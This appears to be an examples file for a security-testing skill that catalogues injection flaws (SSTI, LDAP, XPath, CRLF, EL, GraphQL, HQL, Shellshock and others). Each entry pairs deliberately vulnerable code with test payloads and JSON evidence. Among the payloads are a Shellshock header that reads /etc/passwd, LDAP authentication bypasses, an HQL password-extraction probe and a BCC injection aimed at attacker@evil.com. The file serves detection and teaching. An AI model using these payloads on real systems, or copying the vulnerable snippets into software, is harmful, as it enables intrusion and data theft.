# Injection Testing Examples (Miscellaneous)

This file contains examples of miscellaneous injection vulnerabilities NOT covered by dedicated skills.

**For dedicated skills, see:**
- SQL Injection → `sql-injection-testing/examples.md`
- NoSQL Injection → `nosql-injection-testing/examples.md`
- XSS → `xss-testing/examples.md`
- XXE → `xxe-testing/examples.md`
- Command Injection → `command-injection-testing/examples.md`

## Table of Contents
1. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
2. [LDAP Injection](#ldap-injection)
3. [XPath Injection](#xpath-injection)
4. [XQuery Injection](#xquery-injection)
5. [CRLF / HTTP Header Injection](#crlf--http-header-injection)
6. [Email Header Injection](#email-header-injection)
7. [Expression Language Injection](#expression-language-injection)
8. [JSON/JavaScript Eval Injection](#jsonjavascript-eval-injection)
9. [GraphQL Injection](#graphql-injection)
10. [CSV/Formula Injection](#csvformula-injection)
11. [Regex Injection (ReDoS)](#regex-injection-redos)
12. [ORM/HQL Injection](#ormhql-injection)
13. [YAML/Config Injection](#yamlconfig-injection)
14. [Shellshock Injection](#shellshock-injection)
15. [Test Result Types](#test-result-types)

---

## Server-Side Template Injection (SSTI)

### Example 1: Jinja2 SSTI (Python/Flask)

**Scenario:** User input rendered directly in Jinja2 template.

**Vulnerability:**
```python
# VULNERABLE
@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    template = f"Hello, {name}!"
    return render_template_string(template)
```

**Test:**
1. Payload: `GET /greet?name={{7*7}}`
2. Detection: Response contains `Hello, 49!`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "ssti_jinja2",
  "cwe": "CWE-1336",
  "test": {
    "url": "http://target.com/greet?name={{7*7}}",
    "method": "GET",
    "status": 200,
    "response_snippet": "Hello, 49!"
  },
  "evidence": "SSTI (Jinja2): {{7*7}} evaluated to 49",
  "payload_used": "{{7*7}}"
}
```

---

### Example 2: Freemarker SSTI (Java)

**Scenario:** Java application using Freemarker templates.

**Test:**
1. Payload: `GET /template?content=${7*7}`
2. Detection: Response contains `49`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "ssti_freemarker",
  "cwe": "CWE-1336",
  "test": {
    "payload": "${7*7}",
    "response_snippet": "Your content: 49"
  },
  "evidence": "SSTI (Freemarker): ${7*7} evaluated",
  "payload_used": "${7*7}"
}
```

---

## LDAP Injection

### Example 3: Wildcard LDAP Injection

**Scenario:** User lookup with injectable LDAP filter.

**Vulnerability:**
```python
# VULNERABLE
def find_user(username):
    filter_str = f"(uid={username})"
    return ldap_conn.search(base_dn, filter_str)
```

**Test:**
1. Baseline: `GET /api/user?name=john` → 1 user (245 bytes)
2. Payload: `GET /api/user?name=*` → 500+ users (12847 bytes)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "ldap_injection",
  "cwe": "CWE-90",
  "baseline": {
    "url": "http://target.com/api/user?name=john",
    "content_length": 245
  },
  "test": {
    "url": "http://target.com/api/user?name=*",
    "content_length": 12847
  },
  "evidence": "LDAP injection: wildcard returned all 500+ users vs 1",
  "payload_used": "*"
}
```

---

### Example 4: LDAP Filter Bypass

**Scenario:** Authentication bypass via LDAP filter manipulation.

**Test:**
1. Payload: `username=admin)(&)` or `username=admin)(|(password=*))`
2. Detection: Authentication bypassed

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "ldap_auth_bypass",
  "cwe": "CWE-90",
  "test": {
    "payload": "admin)(|(password=*))",
    "status": 200,
    "response_snippet": "{\"authenticated\": true, \"user\": \"admin\"}"
  },
  "evidence": "LDAP filter injection: authentication bypassed",
  "payload_used": "admin)(|(password=*))"
}
```

---

## XPath Injection

### Example 5: Boolean-Based XPath Injection

**Scenario:** XML data queried via XPath with user input.

**Vulnerability:**
```python
# VULNERABLE
def get_user(username):
    query = f"//users/user[name='{username}']/data"
    return etree.xpath(query)
```

**Test:**
1. Baseline: `GET /user?name=john` → 1 result
2. Payload: `GET /user?name=' or '1'='1` → All users

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xpath_injection",
  "cwe": "CWE-643",
  "baseline": {"content_length": 150},
  "test": {
    "payload": "' or '1'='1",
    "content_length": 5420
  },
  "evidence": "XPath injection: boolean bypass returned all records",
  "payload_used": "' or '1'='1"
}
```

---

## XQuery Injection

### Example 6: Boolean-Based XQuery Injection

**Scenario:** XQuery expression built using user input (e.g., BaseX, eXist-db, MarkLogic).

**Vulnerability:**
```python
# VULNERABLE (pseudo-code)
def find_user(name: str) -> str:
    xquery = f"for $u in doc('users.xml')//user where $u/name = '{name}' return $u"
    return xquery_engine.execute(xquery)
```

**Test:**
1. Baseline: `GET /user?name=john` → 1 result
2. Payload: `GET /user?name=' or '1'='1` → All users

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xquery_injection",
  "cwe": "CWE-652",
  "baseline": {"content_length": 210},
  "test": {
    "payload": "' or '1'='1",
    "content_length": 6420
  },
  "evidence": "XQuery injection: boolean bypass returned all records",
  "payload_used": "' or '1'='1"
}
```

---

## CRLF / HTTP Header Injection

### Example 7: Response Header Injection

**Scenario:** Redirect URL reflected in response headers.

**Vulnerability:**
```python
# VULNERABLE
@app.route('/redirect')
def redirect():
    url = request.args.get('url')
    response = make_response()
    response.headers['Location'] = url  # No sanitization!
    return response, 302
```

**Test:**
1. Payload: `GET /redirect?url=http://safe.com%0d%0aX-Injected:true`
2. Detection: `X-Injected: true` in response headers

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "crlf_header_injection",
  "cwe": "CWE-113",
  "test": {
    "url": "http://target.com/redirect?url=http://safe.com%0d%0aX-Injected:true",
    "response_headers": {
      "Location": "http://safe.com",
      "X-Injected": "true"
    }
  },
  "evidence": "CRLF injection: arbitrary header added to response",
  "payload_used": "%0d%0aX-Injected:true"
}
```

---

### Example 8: Set-Cookie Injection

**Scenario:** Cookie injection via CRLF.

**Test:**
1. Payload: `GET /redirect?url=test%0d%0aSet-Cookie:session=hijacked`
2. Detection: Cookie set in response

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "crlf_cookie_injection",
  "cwe": "CWE-113",
  "test": {
    "payload": "%0d%0aSet-Cookie:session=hijacked",
    "response_headers": {
      "Set-Cookie": "session=hijacked"
    }
  },
  "evidence": "CRLF injection: arbitrary cookie set via header injection",
  "payload_used": "%0d%0aSet-Cookie:session=hijacked"
}
```

---

## Email Header Injection

### Example 9: BCC Injection

**Scenario:** Contact form with email header injection.

**Vulnerability:**
```python
# VULNERABLE
def send_contact_email(to_email, message):
    email = f"To: {to_email}\nSubject: Contact\n\n{message}"
    smtp.sendmail(from_addr, to_email, email)
```

**Test:**
1. Payload: `email=victim@test.com%0ABcc:attacker@evil.com`
2. Detection: Email sent to attacker as BCC

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "email_header_injection",
  "cwe": "CWE-93",
  "test": {
    "payload": "victim@test.com%0ABcc:attacker@evil.com",
    "injected_header": "Bcc: attacker@evil.com"
  },
  "evidence": "Email header injection: BCC recipient added",
  "payload_used": "%0ABcc:attacker@evil.com"
}
```

---

## Expression Language Injection

### Example 10: Spring EL Injection

**Scenario:** Spring application with EL in user input.

**Vulnerability:**
```java
// VULNERABLE - Spring 3.x with double resolution
@RequestMapping("/page")
public String page(@RequestParam String input, Model model) {
    model.addAttribute("content", input);
    return "page";
}
```

**Test:**
1. Payload: `GET /page?input=${7*7}`
2. Detection: Response contains `49`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "el_injection_spring",
  "cwe": "CWE-917",
  "test": {
    "url": "http://target.com/page?input=${7*7}",
    "response_snippet": "<div>49</div>"
  },
  "evidence": "Spring EL injection: ${7*7} evaluated to 49",
  "payload_used": "${7*7}"
}
```

---

### Example 11: OGNL Injection (Struts)

**Scenario:** Apache Struts with OGNL evaluation.

**Test:**
1. Payload: `GET /action?input=%{7*7}`
2. Detection: Response contains `49`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "ognl_injection",
  "cwe": "CWE-917",
  "test": {
    "payload": "%{7*7}",
    "response_snippet": "Result: 49"
  },
  "evidence": "OGNL injection: %{7*7} evaluated in Struts context",
  "payload_used": "%{7*7}"
}
```

---

## JSON/JavaScript Eval Injection

### Example 12: Node.js eval() Injection

**Scenario:** Backend evaluates a user-controlled expression.

**Vulnerability:**
```javascript
// VULNERABLE
app.get('/calc', (req, res) => {
  const expr = req.query.expr;
  const result = eval(expr);
  res.json({ result });
});
```

**Test:**
1. Payload: `GET /calc?expr=7*7`
2. Detection: Response contains `{"result":49}` (computed, not echoed)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "js_eval_injection",
  "cwe": "CWE-95",
  "test": {
    "url": "http://target.com/calc?expr=7*7",
    "response_snippet": "{\"result\":49}"
  },
  "evidence": "JavaScript eval injection: 7*7 evaluated server-side to 49",
  "payload_used": "7*7"
}
```

---

## GraphQL Injection

### Example 13: GraphQL Introspection

**Scenario:** GraphQL API with introspection enabled.

**Test:**
```graphql
POST /graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "graphql_introspection",
  "cwe": "CWE-200",
  "test": {
    "url": "http://target.com/graphql",
    "query": "{__schema{types{name}}}",
    "response_snippet": "{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"Secret\"}...]}}}"
  },
  "evidence": "GraphQL introspection enabled: full schema exposed",
  "payload_used": "{__schema{types{name}}}"
}
```

---

### Example 14: GraphQL Query Injection

**Scenario:** User input in GraphQL query without sanitization.

**Test:**
```graphql
query {
  user(id: "1' OR '1'='1") {
    name
    email
  }
}
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "graphql_query_injection",
  "cwe": ["CWE-74", "CWE-89"],
  "test": {
    "query": "{user(id:\"1' OR '1'='1\"){name}}",
    "response_snippet": "{\"data\":{\"user\":[{\"name\":\"admin\"},{\"name\":\"john\"}...]}}"
  },
  "evidence": "GraphQL injection: SQL-style bypass returned all users",
  "payload_used": "1' OR '1'='1"
}
```

---

## CSV/Formula Injection

### Example 15: Formula in Exported CSV

**Scenario:** User input exported to CSV without sanitization.

**Vulnerability:**
```python
# VULNERABLE
@app.route('/export')
def export_csv():
    data = get_user_data()  # Contains user-controlled fields
    csv_content = "\n".join([f"{row['name']},{row['comment']}" for row in data])
    return Response(csv_content, mimetype='text/csv')
```

**Test:**
1. Submit comment: `=1+1`
2. Export CSV and open in Excel
3. Detection: Cell shows `2` (formula executed)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "csv_formula_injection",
  "cwe": "CWE-1236",
  "test": {
    "input_field": "comment",
    "payload": "=1+1",
    "exported_csv_snippet": "John,=1+1"
  },
  "evidence": "CSV formula injection: =1+1 stored in export, executes in spreadsheet",
  "payload_used": "=1+1"
}
```

---

## Regex Injection (ReDoS)

### Example 16: Catastrophic Backtracking

**Scenario:** User-controlled regex pattern.

**Vulnerability:**
```python
# VULNERABLE
@app.route('/search')
def search():
    pattern = request.args.get('pattern')
    text = request.args.get('text')
    result = re.search(pattern, text)  # User controls pattern!
    return jsonify({"match": bool(result)})
```

**Test:**
1. Pattern: `(a+)+$`
2. Text: `aaaaaaaaaaaaaaaaaaaaaaaa!`
3. Detection: Response takes >5 seconds

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "redos",
  "cwe": "CWE-1333",
  "baseline": {
    "pattern": "test",
    "response_time_ms": 50
  },
  "test": {
    "pattern": "(a+)+$",
    "text": "aaaaaaaaaaaaaaaaaaaaaaaa!",
    "response_time_ms": 8500
  },
  "evidence": "ReDoS: catastrophic backtracking caused 8.5s delay",
  "payload_used": "(a+)+$ with 24 a's + !"
}
```

---

## ORM/HQL Injection

### Example 17: Hibernate HQL Injection

**Scenario:** Concatenated HQL query.

**Vulnerability:**
```java
// VULNERABLE
String hql = "FROM User WHERE username = '" + username + "'";
Query query = session.createQuery(hql);
```

**Test:**
1. Payload: `admin' AND '1'='1`
2. Detection: Query modified, data returned

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "hql_injection",
  "cwe": ["CWE-89", "CWE-943"],
  "test": {
    "payload": "admin' AND substring(password,1,1)='a",
    "status": 200,
    "response_snippet": "User found"
  },
  "evidence": "HQL injection: boolean-based extraction possible",
  "payload_used": "admin' AND substring(password,1,1)='a"
}
```

---

## YAML/Config Injection

### Example 18: YAML Anchor Abuse

**Scenario:** User YAML input processed by application.

**Test:**
```yaml
admin: &admin_anchor true
user_role: *admin_anchor
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "yaml_anchor_injection",
  "cwe": "CWE-502",
  "test": {
    "payload": "admin: &admin true\nrole: *admin",
    "result": "User granted admin role via anchor reference"
  },
  "evidence": "YAML injection: anchor reference escalated privileges",
  "payload_used": "&anchor + *anchor"
}
```

---

## Shellshock Injection

### Example 19: CGI Shellshock

**Scenario:** CGI script vulnerable to Shellshock (CVE-2014-6271).

**Test:**
```http
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; echo; /bin/cat /etc/passwd
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "shellshock",
  "cwe": "CWE-78",
  "test": {
    "url": "http://target.com/cgi-bin/test.cgi",
    "header": "User-Agent: () { :; }; echo; /bin/id",
    "response_snippet": "uid=33(www-data) gid=33(www-data)"
  },
  "evidence": "Shellshock: command executed via User-Agent header",
  "payload_used": "() { :; }; /bin/id"
}
```

---

## Test Result Types

### FALSE_POSITIVE (Properly Secured)

```json
{
  "status": "FALSE_POSITIVE",
  "injection_type": "ssti",
  "test": {
    "payload": "{{7*7}}",
    "response_snippet": "Hello, {{7*7}}!"
  },
  "evidence": "SSTI mitigated: template syntax rendered as literal text"
}
```

### UNVALIDATED (WAF Blocking)

```json
{
  "status": "UNVALIDATED",
  "injection_type": "ldap_injection",
  "test": {
    "payload": "*",
    "status": 403,
    "response_snippet": "Request blocked"
  },
  "evidence": "Cannot validate - WAF blocks LDAP injection payloads"
}
```

### PARTIAL (Inconclusive)

```json
{
  "status": "PARTIAL",
  "injection_type": "el_injection",
  "tests": {
    "${7*7}": {"result": "literal text"},
    "#{7*7}": {"result": "49"}
  },
  "evidence": "Partial EL injection: #{} syntax evaluated, ${} blocked",
  "requires_manual_review": true
}
```

---

## CWE Reference

| CWE | Name | DAST Testable |
|-----|------|---------------|
| CWE-1336 | SSTI | Yes |
| CWE-90 | LDAP Injection | Yes |
| CWE-643 | XPath Injection | Yes |
| CWE-652 | XQuery Injection | Yes |
| CWE-93 | CRLF Injection | Yes |
| CWE-113 | HTTP Response Splitting | Yes |
| CWE-644 | HTTP Header Injection (Scripting Syntax) | Yes |
| CWE-917 | EL Injection | Yes |
| CWE-1333 | ReDoS | Yes |
| CWE-1236 | CSV/Formula Injection | Yes |
| CWE-94 | Code Injection | Yes |
| CWE-95 | Eval Injection | Yes |
| CWE-89 | SQL Injection (via ORM/HQL/GraphQL sinks) | Yes |
| CWE-943 | Improper Neutralization in Data Query Logic | Yes |
| CWE-200 | Exposure of Sensitive Information | Yes |
| CWE-502 | Deserialization of Untrusted Data (YAML) | Partial |
| CWE-78 | OS Command Injection (Shellshock) | Yes |
| CWE-400 | Uncontrolled Resource Consumption (DoS) | Partial |
| CWE-74 | Injection (parent) | Yes |
